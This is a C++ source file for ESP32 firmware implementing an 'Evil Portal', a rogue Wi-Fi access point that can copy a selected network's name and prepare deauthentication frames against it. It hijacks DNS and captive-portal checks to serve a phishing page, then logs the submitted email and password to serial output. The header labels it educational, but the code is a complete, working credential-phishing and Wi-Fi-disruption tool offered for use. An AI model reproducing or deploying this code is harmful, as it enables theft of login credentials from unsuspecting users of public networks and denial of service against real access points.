#include "evilportalheader.h"

/*
     * evilportal.cpp (Based ESP32 Marauder by @justcallmekoko)
    * /!\ WARNING: All Code I Wrote In This Is For Education Purpose ONLY! /!\
    * /!\        I NOT RESPONSIBLE ANY DAMAGE USER CAUSE IN PUBLIC         /!\
    * Author: Shine Nagumo @Ohminecraft (Xun Anh Nguyen)
    * Licensed under the MIT License.
*/

AsyncWebServer server(80);
DNSServer dnsServer;
const IPAddress AP_IP(172, 0, 0, 1);

class CaptiveRequestHandler : public AsyncWebHandler {
    public:
        CaptiveRequestHandler() {}
        virtual ~CaptiveRequestHandler() {}

        bool canHandle(AsyncWebServerRequest *request) { return true; }

        void handleRequest(AsyncWebServerRequest *request) {
            request->send(200, "text/html", index_html);
        }
};

uint8_t deauth_frame[sizeof(wifi.deauth_frame_packet)];
uint8_t disassoc_frame[sizeof(wifi.disassoc_frame_packet)];


EvilPortalAddtional::EvilPortalAddtional() 
{
}

String EvilPortalAddtional::get_password() {
    return this->password;
}

String EvilPortalAddtional::get_user_name() {
    return this->user_name;
}

void EvilPortalAddtional::shutdownServer() {
    this->runServer = false;
    server.end();
    dnsServer.stop();
    WiFi.disconnect();
    Serial.println("[INFO] Successfully Shutdown Portal");
}

void EvilPortalAddtional::main() {
    this->runServer = false;
    this->name_received = false;
    this->password_received = false;
    this->has_html = false;
    this->has_ap = false;

    //html_files = new LinkedList<String>();

    Serial.println("[INFO] Successfully setup Evil Portal");
}

void EvilPortalAddtional::loop() {
    if (this->has_ap && this->has_html) {
        dnsServer.processNextRequest();
        if (this->name_received && this->password_received) {
            this->name_received = false;
            this->password_received = false;
            Serial.println("[INFO] User Name: " + user_name);
            Serial.println("[INFO] Password: " + password);
        }
    }
}

void EvilPortalAddtional::serverSetup() {

    server.on("/", HTTP_GET, [this](AsyncWebServerRequest *request) {
        request->send(200, "text/html", index_html);
        Serial.println("[INFO] Successfully connected server with client");
    });

    
    const char* captiveEndpoints[] = {
        "/hotspot-detect.html",
        "/library/test/success.html",
        "/success.txt",
        "/generate_204",
        "/gen_204",
        "/ncsi.txt",
        "/connecttest.txt",
        "/redirect"
    };

    for (int i = 0; i < GET_SIZE(captiveEndpoints); i++) {
        server.on(captiveEndpoints[i], HTTP_GET, [this](AsyncWebServerRequest *request){
            request->send(200, "text/html", index_html);
        });
    }

    server.on("/get-ap-name", HTTP_GET, [this](AsyncWebServerRequest *request) {
        request->send(200, "text/plain", WiFi.softAPSSID());
    });

    server.on("/get", HTTP_GET, [this](AsyncWebServerRequest *request) {
        String inputMessage;

        if (request->hasParam("email")) {
        inputMessage = request->getParam("email")->value();
        this->user_name = inputMessage;
        this->name_received = true;
        }

        if (request->hasParam("password")) {
        inputMessage = request->getParam("password")->value();
        this->password = inputMessage;
        this->password_received = true;
        }

        request->send(
        200, "text/html",
        "<html><head><script>setTimeout(() => { window.location.href ='/' }, 100);</script></head><body></body></html>");
    });
    Serial.println("[INFO] Server request READY!");
}

String htmlFile;

bool EvilPortalAddtional::htmlSetup() {
    bool usedefault = false;
    if (htmlFile == "") {
        Serial.println("[WARN] No have html file selected, using default html file instead");
        usedefault = true;
    }
    File htmlfileselected = sdcard.getFile(htmlFile, FILE_READ);
    if (!htmlfileselected) {
        Serial.println("[WARN] html file selected not found or corrupted, using default html file instead");
        usedefault = true;
    } 
    if (htmlfileselected.size() > MAX_HTML_SIZE) {
        Serial.println("[WARN] HTML file selected too large, using default html file instead");
        usedefault = true;
    }
    if (usedefault) strlcpy(index_html, default_html, strlen(default_html));
    else {
        String html = "";
        while (htmlfileselected.available()) {
            char c = htmlfileselected.read();
            if (isPrintable(c))
                html.concat(c);
        }
        strlcpy(index_html, html.c_str(), strlen(html.c_str()));
    }
    this->has_html = true;
    Serial.println("[INFO] Set html file successfully");
    return true;
}

bool EvilPortalAddtional::apSetup(String essid, bool _deauth) {
    String ap_name = "";
    user_name = "";
    password = "";
    if (essid == "") {
        for (int i = 0; i < access_points->size(); i++) {
            if (access_points->get(i).selected) {
                if (_deauth) {
                    memcpy(deauth_frame, wifi.deauth_frame_packet, sizeof(wifi.deauth_frame_packet));
                    memcpy(disassoc_frame, wifi.disassoc_frame_packet, sizeof(wifi.disassoc_frame_packet));
                    esp_wifi_set_channel(access_points->get(i).channel, WIFI_SECOND_CHAN_NONE);
                    vTaskDelay(50 / portTICK_PERIOD_MS);
                    memcpy(&deauth_frame[10], access_points->get(i).bssid, 6);
                    memcpy(&deauth_frame[16], access_points->get(i).bssid, 6);

                    memcpy(&disassoc_frame[10], access_points->get(i).bssid, 6);
                    memcpy(&disassoc_frame[16], access_points->get(i).bssid, 6);
                }
                ap_name = access_points->get(i).essid;
                break;
            }
        }
    } else {
        ap_name = essid;
    }
    
    if (ap_name == "") {
        Serial.println("[WARN] Cannot get selected AP Name, using default name instead");
        ap_name = espatsettings.evilportalSSID;
    }

    if (ap_name.length() > MAX_AP_NAME_SIZE) {
        Serial.println("[ERROR] Failed to set AP because The given AP is too large");
        Serial.println("[ERROR] AP Name Byte Limit: " + String(MAX_AP_NAME_SIZE));
        return false;
    }
    
    if (ap_name != "") {
        strncpy(evilapName, ap_name.c_str(), MAX_AP_NAME_SIZE);
        this->has_ap = true;
        Serial.println("[INFO] AP set successfully");
        return true;
    }
    else {
        return false;
    }
}

void EvilPortalAddtional::apStart() {

    Serial.print("[INFO] Starting AP as name: ");
    Serial.println(evilapName);
    WiFi.mode(WIFI_OFF);
    WiFi.mode(WIFI_AP);
    WiFi.softAPConfig(AP_IP, AP_IP, IPAddress(255, 255, 255, 0));
    WiFi.softAP(evilapName);

    Serial.print("[INFO] Ip address: ");
    Serial.println(WiFi.softAPIP());

    this->serverSetup();

    dnsServer.start(53, "*", WiFi.softAPIP());
    server.addHandler(new CaptiveRequestHandler()).setFilter(ON_AP_FILTER);
    server.begin();
    this->runServer = true;
    Serial.println("[INFO] Evil Portal Started Successfully");
    Serial.println("[INFO] Evil Portal READY!");
}